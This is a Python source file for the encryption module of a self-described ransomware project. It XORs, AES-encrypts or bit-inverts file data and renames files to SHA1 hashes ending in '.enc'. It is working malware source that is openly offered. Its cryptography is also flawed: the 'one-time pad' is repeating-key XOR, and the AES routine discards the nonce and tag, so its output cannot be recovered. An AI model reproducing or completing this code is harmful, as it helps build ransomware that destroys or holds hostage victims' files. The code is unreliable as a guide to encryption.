from string import ascii_letters, digits
from random import SystemRandom
from hashlib import sha1
from Crypto.Cipher import AES


'''
    The Encrypter class is responsible for encrypting and modifying data. For this purpose, the files are opened
    outside the class, in binary, and this data is then passed to the methods of the Encrypter class. 
    The class can encrypt and decrypt in OTP and AES-128 EAX mode. Decryption is not used in the ransomware's flow, but it can be used 
    for debugging purposes and in case of unwanted encryption. Besides the 2 encryption methods, the class can also invert the bits of a file. 
    In addition, the Encrypter can generate a random key and hash filenames using the SHA1 hashing algorithm.
    The default values of the attributes are set when an object is initialized.

'''
class Encrypter:

    def __init__(self, encMode="INVB", key="aaaaaaaaaaaaaaaa") -> None:
        self.encMode = encMode
        self.key = key
        

    '''
        Encrypts data with the "One Time Pad" (Vernam, 1917) algorithm
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''
    def OTPVernam(self, byteData) -> bytes:
        byteidx = 0
        cipher = bytearray(byteData)
        for byte in byteData:
            keyidx = byteidx % len(self.key)
            cipher[byteidx] = byte ^ ord(self.key[keyidx])
            byteidx+=1
        return cipher

    '''
        Inverts all bits of data through xor operations
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''
    def INVB(self, byteData) -> bytes:
        data = list(byteData)
        for i in range(len(data)):
            data[i] = data[i] ^ 0xff
        cipher = bytes(data)
        return cipher


    '''
        Encrypts the data with the "AES-128 EAX mode" algorithm
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''
    def AES(self, byteData) -> bytes:
         iv = bytes(''.join(SystemRandom().choice(ascii_letters + digits) for _ in range(16)), "utf-8")
         cipher = AES.new(bytes(self.key, "utf-8"), AES.MODE_EAX, iv)
         ciphertext, tag = cipher.encrypt_and_digest(byteData)
         cipherw = cipher.nonce + tag + ciphertext
         return ciphertext

    
    '''
        Decrypts data, which were encrypted with "AES-128 EAX mode"
        @param nonce: nonce, which was passed in a ciphertext after encryption (16 bytes)
        @param tag: tag, which was passed in a ciphertext after encryption (16 bytes)
        @param ciphertext: The binary data of a ciphertext
        @return: plaintext, if decryption was successfull
    '''
    def AESdec(self, nonce, tag, ciphertext) -> bytes:
        cipher = AES.new(bytes(self.key, "utf-8"), AES.MODE_EAX, nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext


    '''
        Hashes a string with sha1 and ends the extension .enc
        @param filename: filename, which will be hashed
        @return: hashed filename
    '''
    def fileNameByHashSHA1(self, fileName) -> str:   
        return str(sha1(bytes(fileName, encoding='utf8')).hexdigest()) + ".enc"
    

    '''
        Encrypt/modifies a file with an a algrothm based on the choice of the user
        @param byteData:  binary data of a file
        @return: encrypted data of a file
    '''
    def enc(self, byteData) -> bytes:
        if self.encMode == "OTP": 
            return self.OTPVernam(byteData)
        elif self.encMode == "AES":
            return self.AES(byteData)
        else:
            return self.INVB(byteData)
